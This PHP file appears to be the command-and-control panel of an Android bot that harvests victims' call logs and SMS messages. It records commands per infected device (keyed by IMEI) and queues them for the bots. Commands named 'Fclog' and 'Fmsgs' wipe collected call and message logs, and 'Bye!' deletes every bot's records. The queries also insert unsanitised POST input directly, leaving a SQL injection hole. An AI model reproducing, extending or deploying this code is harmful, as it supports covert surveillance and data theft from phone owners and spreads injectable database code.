<?php
$botid = $_POST['imei'];
$command = $_POST['command'];
$trank = '';
$meow = '';
$UID = $botid;
$Command = $command;

$getCall = "getCall";



    //open connection to mysql db
   include 'DatabaseConfig.php' ;
 
 $connection = mysqli_connect($HostName,$HostUser,$HostPass,$DatabaseName);


  //**************************************************************************************************


   $sql = "INSERT INTO tbl_cmdhistory (clm_command, clm_device_imei) VALUES ('$command', '$botid')";
    
    $result = mysqli_query($connection, $sql) or die("Error in Selecting " . mysqli_error($connection));
      $emparray = array();
    while($row =mysqli_fetch_assoc($result))
    {
        $emparray[] = $row;
    }
    echo json_encode($emparray);
    echo json_encode("Command Added Successfully!");

    //close the db connection
 

    
    //****************************************************************************************************
     if($command == 'Fclog') {
	 
    $sql1 = "DELETE FROM tbl_rcallogs";
    
 $result = mysqli_query($connection, $sql1) or die("Error in Selecting " . mysqli_error($connection));
     

   $sql = "UPDATE tbl_device SET clm_currentcommand='$command' , clm_commandseen='0'";
    
    $result = mysqli_query($connection, $sql) or die("Error in Selecting " . mysqli_error($connection));
      $emparray = array();
    while($row =mysqli_fetch_assoc($result))
    {
        $emparray[] = $row;
    }
    echo json_encode($emparray);
    echo json_encode("Command Added Successfully!");

    //close the db connection

}
//*************************************************************************
  else if($command == 'Fmsgs') {
    $sql1 = "DELETE FROM tbl_rsmslogs";
    
 $result = mysqli_query($connection, $sql1) or die("Error in Selecting " . mysqli_error($connection));
     

   $sql = "UPDATE tbl_device SET clm_currentcommand='$command' , clm_commandseen='0'";
    
    $result = mysqli_query($connection, $sql) or die("Error in Selecting " . mysqli_error($connection));
      $emparray = array();
    while($row =mysqli_fetch_assoc($result))
    {
        $emparray[] = $row;
    }
    echo json_encode($emparray);
    echo json_encode("Command Added Successfully!");

    //close the db connection

}
//**************************************************************************
else if($command == 'Bye!') {
    $sql1 = "DELETE FROM tbl_device";
        $sql2 = "DELETE FROM tbl_rsmslogs";
        $sql3 = "DELETE FROM tbl_rcallogs";

 $result = mysqli_query($connection, $sql1) or die("Error in Selecting " . mysqli_error($connection));
 $result = mysqli_query($connection, $sql2) or die("Error in Selecting " . mysqli_error($connection));
 $result = mysqli_query($connection, $sql3) or die("Error in Selecting " . mysqli_error($connection));


   $sql = "DELETE from tbl_device_details";
    
    $result = mysqli_query($connection, $sql) or die("Error in Selecting " . mysqli_error($connection));
      $emparray = array();
    while($row =mysqli_fetch_assoc($result))
    {
        $emparray[] = $row;
    }
    echo json_encode($emparray);
    echo json_encode("Bot Disconnected!!");

    //close the db connection

}
//****************************************************************************

else {

 
 
   $sql = "UPDATE tbl_device SET clm_currentcommand='$command' , clm_commandseen='0'";
    
    $result = mysqli_query($connection, $sql) or die("Error in Selecting " . mysqli_error($connection));
      $emparray = array();
    while($row =mysqli_fetch_assoc($result))
    {
        $emparray[] = $row;
    }
    echo json_encode($emparray);
    echo json_encode("Command Added Successfully!");

 }
 
 
 
 //*************************************************************************
 ?>
  <script>
							  function clickfunc(obj) {
                                 var t = $(obj).text();
								   $.post('config.php', { text: t, function(data) { 
                                   console.log(data); 
                                   }});
                                  
								 }
								 </script>